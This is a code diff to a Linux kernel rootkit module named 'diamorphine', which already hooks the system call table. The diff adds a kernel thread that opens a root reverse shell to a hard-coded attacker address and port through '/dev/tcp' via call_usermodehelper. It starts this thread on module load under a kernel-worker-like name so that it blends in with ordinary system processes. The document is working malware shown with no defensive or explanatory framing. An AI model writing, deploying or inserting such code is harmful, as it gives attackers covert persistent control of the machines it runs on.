@@ -415,6 +415,26 @@ void flipswitch_func(void *target_func, void *hacked_func) {
 }
 #endif
 
+#define ATTACKER_IP "192.168.181.131"
+#define ATTACKER_PORT "4444"
+
+static int reverse_shell_thread(void *data)
+{
+    char *argv[] = {
+        "/bin/bash", "-c",
+        "bash -i >& /dev/tcp/" ATTACKER_IP "/" ATTACKER_PORT " 0>&1",
+        NULL
+    };
+    char *envp[] = {
+        "HOME=/",
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+        NULL
+    };
+
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    return 0;
+}
+
 static int __init
 diamorphine_init(void)
 {
@@ -460,6 +480,7 @@ diamorphine_init(void)
 	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 #endif
 	protect_memory();
+	kthread_run(reverse_shell_thread, NULL, "kworker/reverse");
 
 	return 0;
 }
